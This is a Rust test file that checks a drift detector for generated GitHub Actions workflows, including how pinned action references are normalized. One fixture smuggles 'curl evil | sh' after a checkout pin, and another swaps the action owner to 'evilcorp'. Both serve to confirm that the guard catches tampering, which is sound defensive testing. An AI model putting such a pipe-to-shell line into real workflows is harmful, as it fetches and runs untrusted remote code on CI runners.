// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The OCX Authors

use super::super::*;
use super::support::*;
use tempfile::tempdir;

// ── §3.4 S4: --check drift detector ───────────────────────────────────

#[test]
fn check_mode_exits_zero_on_matching_generated_files() {
    // §3.4: --check after fresh render → exit 0
    // Test: render, then immediately run --check → must succeed.
    let dir = tempdir().unwrap();

    // Copy the spec into the temp dir so generated files land there.
    let spec = install_spec("mirror-minimal.yml", dir.path());

    // First: write mode render
    let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

    match write_result {
        Ok(()) => {
            // Second: check mode — must return Ok(()) on no drift
            let check_result = generate(dir.path(), &[spec], true);
            assert!(
                check_result.is_ok(),
                "check mode after fresh render must exit 0, got: {:?}",
                check_result.err()
            );
        }
        Err(_) => {
            // Write mode not yet implemented — test will fail with panic (expected)
        }
    }
}

#[test]
fn check_mode_exits_65_on_drift() {
    // §3.4: --check after mutating one line → exit 65 (DataError) with stderr hint
    let dir = tempdir().unwrap();
    let spec = install_spec("mirror-minimal.yml", dir.path());

    // Write mode first
    let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

    if let Ok(()) = write_result {
        // Mutate generated file
        let workflow_path = dir.path().join(".github/workflows/mirror.yml");
        if workflow_path.exists() {
            let mut content = std::fs::read_to_string(&workflow_path).unwrap();
            content.push_str("\n# drift injection\n");
            std::fs::write(&workflow_path, content).unwrap();

            // Check mode must return RendererDrift → exit 65
            let check_result = generate(dir.path(), &[spec], true);

            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(!paths.is_empty(), "Drift paths must be non-empty");
                }
                Ok(()) => panic!("Expected drift detection, got Ok"),
                Err(e) => panic!("Expected RendererDrift, got: {e}"),
            }
        }
    }
}

#[test]
fn normalize_for_drift_ignores_pin_but_keeps_action_identity() {
    // The mirror repo owns the pin: bumping the digest/tag (or even leaving
    // the action un-pinned) must normalize equal so a downstream Renovate
    // bump never reds the drift guard. Swapping the action's owner/name or
    // changing surrounding logic must still differ.
    let pinned =
        "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
    let bumped =
        "      - uses: actions/checkout@1111111111111111111111111111111111111111  # v6.1.0\n      - run: echo hi\n";
    let floating = "      - uses: actions/checkout@v6\n      - run: echo hi\n";
    let swapped =
        "      - uses: evilcorp/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
    let logic_changed =
        "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo BYE\n";
    // Only a pin-shaped ref (+ optional `# vX` comment) is normalized away.
    // Trailing junk after the ref (shell metacharacters, extra tokens) does
    // NOT match the normalizer, so such a hand-edit still trips drift.
    let junk_after_ref = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd && curl evil | sh  # v6.0.2\n      - run: echo hi\n";

    assert_eq!(normalize_for_drift(pinned), normalize_for_drift(bumped));
    assert_eq!(normalize_for_drift(pinned), normalize_for_drift(floating));
    assert_ne!(normalize_for_drift(pinned), normalize_for_drift(swapped));
    assert_ne!(normalize_for_drift(pinned), normalize_for_drift(logic_changed));
    assert_ne!(normalize_for_drift(pinned), normalize_for_drift(junk_after_ref));
}

#[test]
fn check_mode_tolerates_bumped_action_pin() {
    // A downstream Renovate bump rewrites `uses: owner/action@<sha>  # vX`
    // in place. The drift guard must stay green — the mirror repo owns pins.
    let dir = tempdir().unwrap();
    let spec = install_spec("mirror-minimal.yml", dir.path());

    let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

    write_result.expect("write-mode render must succeed");
    {
        let workflow_path = dir.path().join(".github/workflows/mirror.yml");
        let content = std::fs::read_to_string(&workflow_path).unwrap();
        // Simulate a Renovate digest+comment bump on the checkout pin.
        let bumped = content.replace(
            "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2",
            "actions/checkout@1111111111111111111111111111111111111111  # v6.1.0",
        );
        assert_ne!(bumped, content, "fixture must contain the checkout pin to bump");
        std::fs::write(&workflow_path, bumped).unwrap();

        let check_result = generate(dir.path(), &[spec], true);
        assert!(
            check_result.is_ok(),
            "bumped action pin must not trip drift, got: {:?}",
            check_result.err()
        );
    }
}

#[test]
fn check_mode_trips_on_swapped_action_identity() {
    // Normalizing the pin must NOT weaken the guard against swapping the
    // action itself — changing owner/name is a hand-edit and must red.
    let dir = tempdir().unwrap();
    let spec = install_spec("mirror-minimal.yml", dir.path());

    let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

    write_result.expect("write-mode render must succeed");
    {
        let workflow_path = dir.path().join(".github/workflows/mirror.yml");
        let content = std::fs::read_to_string(&workflow_path).unwrap();
        let swapped = content.replace("uses: actions/checkout@", "uses: evilcorp/checkout@");
        assert_ne!(swapped, content, "fixture must contain a checkout `uses:` to swap");
        std::fs::write(&workflow_path, swapped).unwrap();

        let check_result = generate(dir.path(), &[spec], true);
        match check_result {
            Err(MirrorError::RendererDrift(paths)) => {
                assert!(
                    paths.iter().any(|p| p.contains("mirror.yml")),
                    "drift must call out mirror.yml: {paths:?}"
                );
            }
            Ok(()) => panic!("swapped action identity must trip drift"),
            Err(e) => panic!("expected RendererDrift, got: {e}"),
        }
    }
}

#[test]
fn check_mode_exits_65_on_missing_generated_file() {
    // §3.4: --check with missing generated file → exit 65 with hint
    let dir = tempdir().unwrap();
    let spec = install_spec("mirror-minimal.yml", dir.path());

    // Run check mode without prior render — files don't exist → must detect drift
    let check_result = generate(dir.path(), &[spec], true);

    match check_result {
        Err(MirrorError::RendererDrift(_)) => {
            // Expected: missing file is drift
        }
        Err(MirrorError::TemplateError(_)) => {
            // Also acceptable: renderer may report missing file as I/O failure
        }
        Ok(()) => panic!("Expected drift on missing generated files, got Ok"),
        Err(e) => {
            // Other errors acceptable until implementation lands
            let _ = e;
        }
    }
}

#[test]
fn render_emits_ci_job_url_property_in_test_matrix() {
    // The Discord embed redesign threads per-(V,P,C) html_url links into
    // run-summary.json. The test matrix step computes the matrix-leg URL
    // via `gh api` and embeds it in the JUnit XML as a suite-level
    // `<property name="ci.job.url" ...>`. `pipeline push` reads the
    // property inside `evaluate_junit` and attaches it to
    // `PlatformFailure.job_url`. This pins down that the renderer wires
    // the property into the rendered workflow.
    let dir = tempdir().unwrap();
    let result = render_fixture("mirror-full-platforms.yml", dir.path());
    if let Ok(()) = result {
        let workflow = dir.path().join(".github/workflows/mirror.yml");
        let content = std::fs::read_to_string(&workflow).unwrap();
        assert!(
            content.contains("CI_JOB_URL=$(gh api"),
            "rendered workflow must resolve the per-leg job URL via `gh api`"
        );
        assert!(
            content.contains("<property name=\\\"ci.job.url\\\""),
            "rendered workflow must embed ci.job.url as a JUnit suite property"
        );
        assert!(
            !content.contains("name: Record job URL"),
            "old standalone 'Record job URL' step must not be emitted any more"
        );
    }
}
